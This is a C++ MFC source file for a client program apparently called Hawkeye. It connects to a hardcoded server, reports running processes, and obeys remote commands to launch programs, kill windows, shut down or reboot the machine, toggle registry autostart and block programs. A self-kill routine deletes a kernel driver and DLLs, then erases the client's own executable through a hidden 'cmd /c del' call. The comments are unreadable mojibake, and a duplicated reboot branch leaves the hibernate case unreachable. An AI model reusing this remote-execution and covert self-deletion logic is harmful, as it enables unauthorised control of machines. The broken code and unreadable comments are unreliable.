
// Hawkeye_client.cpp : ���� ���α׷��� ���� Ŭ���� ������ �����մϴ�.
//

#include "stdafx.h"
#include "Hawkeye_client.h"
#include "Hawkeye_clientDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define MAX_BUF_SIZE 1024

// CHawkeye_clientApp

BEGIN_MESSAGE_MAP(CHawkeye_clientApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CHawkeye_clientApp ����

CHawkeye_clientApp::CHawkeye_clientApp()
{
	// �ٽ� ���� ������ ����
	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;
	isConnect = TRUE;
	// TODO: ���⿡ ���� �ڵ带 �߰��մϴ�.
	// InitInstance�� ��� �߿��� �ʱ�ȭ �۾��� ��ġ�մϴ�.
}

// ������ CHawkeye_clientApp ��ü�Դϴ�.

CHawkeye_clientApp theApp;


// CHawkeye_clientApp �ʱ�ȭ

BOOL CHawkeye_clientApp::InitInstance()
{
	// ���� ���α׷� �Ŵ��佺Ʈ�� ComCtl32.dll ���� 6 �̻��� ����Ͽ� ���־� ��Ÿ����
	// ����ϵ��� �����ϴ� ���, Windows XP �󿡼� �ݵ�� InitCommonControlsEx()�� �ʿ��մϴ�.
	// InitCommonControlsEx()�� ������� ������ â�� ���� �� �����ϴ�.
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);
	// ���� ���α׷����� ����� ��� ���� ��Ʈ�� Ŭ������ �����ϵ���
	// �� �׸��� �����Ͻʽÿ�.
	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinApp::InitInstance();

	if (!AfxSocketInit())
	{
		AfxMessageBox(IDP_SOCKETS_INIT_FAILED);
		return FALSE;
	}
	//�ߺ����� ����
	CString strTemp;
	strTemp.Format(L"%s",AfxGetAppName());
	HANDLE hEvent;
	hEvent = CreateEvent(NULL, FALSE, TRUE, AfxGetAppName());

	if ( GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CWnd* pWnd = NULL;
		pWnd = CWnd::FindWindow(NULL,  AfxGetAppName());
		if(pWnd)       // �ߺ� ������ �Ǿ��� ���
		{
			return FALSE;
		}	
	}
	//
	// ��ȭ ���ڿ� �� Ʈ�� �� �Ǵ�
	// �� ��� �� ��Ʈ���� ���ԵǾ� �ִ� ��� �� �����ڸ� ����ϴ�.
	CShellManager *pShellManager = new CShellManager;

	// ǥ�� �ʱ�ȭ
	// �̵� ����� ������� �ʰ� ���� ���� ������ ũ�⸦ ���̷���
	// �Ʒ����� �ʿ� ���� Ư�� �ʱ�ȭ
	// ��ƾ�� �����ؾ� �մϴ�.
	// �ش� ������ ����� ������Ʈ�� Ű�� �����Ͻʽÿ�.
	// TODO: �� ���ڿ��� ȸ�� �Ǵ� ������ �̸��� ����
	// ������ �������� �����ؾ� �մϴ�.
	SetRegistryKey(_T("���� ���� ���α׷� �����翡�� ������ ���� ���α׷�"));

	CHawkeye_clientDlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
		// TODO: ���⿡ [Ȯ��]�� Ŭ���Ͽ� ��ȭ ���ڰ� ������ �� ó����
		//  �ڵ带 ��ġ�մϴ�.
	}
	else if (nResponse == IDCANCEL)
	{
		// TODO: ���⿡ [���]�� Ŭ���Ͽ� ��ȭ ���ڰ� ������ �� ó����
		//  �ڵ带 ��ġ�մϴ�.
	}

	// ������ ���� �� �����ڸ� �����մϴ�.
	if (pShellManager != NULL)
	{
		delete pShellManager;
	}
	// ��ȭ ���ڰ� �������Ƿ� ���� ���α׷��� �޽��� ������ �������� �ʰ�  ���� ���α׷��� ���� �� �ֵ��� FALSE��
	// ��ȯ�մϴ�.
	return FALSE;
}
void CHawkeye_clientApp::SelfKilling()
{

	char lCommand[MAX_BUF_SIZE + 1];
	char lFile[MAX_BUF_SIZE + 1];

	_unlink("ddkhook.sys");
	_unlink("mfc100u.dll");
	_unlink("msvcr100.dll");

	ZeroMemory(lCommand, sizeof(lCommand));

	if((GetModuleFileNameA(0, lFile, sizeof(lFile)) != 0) && (GetShortPathNameA(lFile, lFile, MAX_BUF_SIZE) != 0))
	{
		_snprintf(lCommand, sizeof(lCommand) - 1, "/c del %s >> NUL", lFile);
		GetEnvironmentVariableA("ComSpec", lFile, MAX_PATH) && ShellExecuteA(0, 0, lFile, lCommand, 0, SW_HIDE);
	}// else
	exit(0);

}
void CHawkeye_clientApp::SetListPointer(CHawkeye_clientDlg* hecd)
{
	phe = hecd;
}
BOOL CHawkeye_clientApp::ConnectServ()
{
	CHKSock* pSock = new CHKSock();
	pSock->Create();
	isConnect = TRUE;
	CString dtime;
	_wstrtime((TCHAR*)dtime.GetString());
	phe->m_listlog.InsertItem(0,dtime);
	phe->m_listlog.SetItemText(0,1,L"NETWORK");
	phe->m_listlog.SetItemText(0,2,L"Connected");
	phe->m_listlog.UpdateData(false);
	clasock = pSock;
	return TRUE;
}
void CHawkeye_clientApp::SendData(DWORD Delay,TCHAR* procName)
{
	Mesinfo mi;
	CString addr;
	UINT port;
	clasock->GetSockName(addr,port);
	lstrcpy(mi.mip,addr.GetBuffer(addr.GetLength()));
	addr.ReleaseBuffer();
	mi.mport = port;
	mi.mdelay = Delay;

	lstrcpy(mi.mprocname,procName);

	clasock->Send(&mi,sizeof(mi));

	CString dtime;
	_wstrtime((TCHAR*)dtime.GetString());
	
	phe->m_listlog.InsertItem(0,dtime);
	phe->m_listlog.SetItemText(0,1,L"SEND");
	//TCHAR temp[128];
	//wsprintf(temp,L"[%d ms] [%s]",Delay,procName.GetString());
	phe->m_listlog.SetItemText(0,2,mi.mprocname);
	phe->m_listlog.UpdateData(false);
}

void CHawkeye_clientApp::ReceiveData()
{
	CommandMes cm;
	clasock->Receive(&cm,sizeof(cm));
	if(cm.mtype == SELF_KILLING)
	{
		SelfKilling();
	}
	else if(cm.mtype == REG_TRUE)
	{
		phe->m_againreg = true;
		phe->SetRegistyStartProgram(TRUE);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"Regstry Able");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == REG_FALSE)
	{
		phe->m_againreg = false;
		phe->SetRegistyStartProgram(FALSE);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"Regstry Disable");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == SEND_MES)
	{
		AfxMessageBox(cm.minfo,MB_ICONEXCLAMATION);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"Message");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == ON_PROGRAM)
	{
		::ShellExecute(NULL, L"open", cm.minfo,L"", NULL, SW_SHOW);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"Execute");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == TM_PROGRAM)
	{
		HWND hExit;
		hExit = ::FindWindowW(NULL,cm.minfo);
		if(hExit != NULL)
		{
			::PostMessageW(hExit,WM_QUIT,0,0);
			CString dtime;
			_wstrtime((TCHAR*)dtime.GetString());
			phe->m_listlog.InsertItem(0,dtime);
			phe->m_listlog.SetItemText(0,1,L"COMMAND");
			phe->m_listlog.SetItemText(0,2,L"Terminate");
			phe->m_listlog.UpdateData(false);
		}
	}
	else if(cm.mtype == SHUT_DOWN)
	{
		phe->SystemShutdown(0);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"Shutdown");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == RE_BOOT)
	{
		phe->SystemShutdown(1);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"Reboot");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == RE_BOOT)
	{
		phe->SystemShutdown(2);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"Hibernates");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == BLOCK_PROGRAM)
	{
		phe->InsertBlockList(cm.minfo);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"InsertBlock");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == UNBLOCK_PROGRAM)
	{
		phe->DeleteBlockList(cm.minfo);
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"DeleteBlock");
		phe->m_listlog.UpdateData(false);
	}
	else if(cm.mtype == ALLRELEASE_PROGRAM)
	{
		phe->AllDeleteBlockList();
		CString dtime;
		_wstrtime((TCHAR*)dtime.GetString());
		phe->m_listlog.InsertItem(0,dtime);
		phe->m_listlog.SetItemText(0,1,L"COMMAND");
		phe->m_listlog.SetItemText(0,2,L"AllRelease");
		phe->m_listlog.UpdateData(false);
	}
}
void CHawkeye_clientApp::DisConnectServ()
{
	CString dtime;
	_wstrtime((TCHAR*)dtime.GetString());
	phe->m_listlog.InsertItem(0,dtime);
	phe->m_listlog.SetItemText(0,1,L"NETWORK");
	phe->m_listlog.SetItemText(0,2,L"Disconnected");
	phe->m_listlog.UpdateData(false);
	isConnect = false;
}
BOOL CHawkeye_clientApp::isConnected()
{
	return isConnect;
}
void CHawkeye_clientApp::CleanUp()
{
	delete clasock;
}
void CHawkeye_clientApp::ConnectWait()
{
	clasock->Connect(L"210.115.226.148",9000);
	//clasock->Connect(L"203.253.248.120",2222);
}